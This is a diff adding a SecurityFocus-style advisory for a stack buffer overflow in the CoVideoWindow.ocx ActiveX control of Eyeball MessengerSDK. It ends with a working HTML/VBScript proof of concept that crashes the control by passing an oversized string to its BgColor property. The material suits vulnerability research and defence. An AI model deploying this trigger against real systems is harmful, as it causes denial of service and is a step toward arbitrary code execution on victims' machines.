@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/30424/info
+
+The 'CoVideoWindow.ocx' ActiveX control of Eyeball MessengerSDK is prone to a stack-based buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied input.
+
+An attacker can exploit this issue to execute arbitrary code in the context of an application using the affected ActiveX control (typically Internet Explorer). Failed attacks will likely cause denial-of-service conditions.
+
+This issue affects 'CoVideoWindow.ocx' 5.0.907.1; other versions may also be affected.
+
+<html> <object classid='clsid:CA06EE71-7348-44c4-9540-AAF0E6BD1515' id='test'></object> <input language=VBScript onclick=buffero() type=button value="Crash"> <script language = 'vbscript'> Sub buffero() crash = String(515000, unescape("%41")) test.BgColor = crash End Sub </script> </html> 
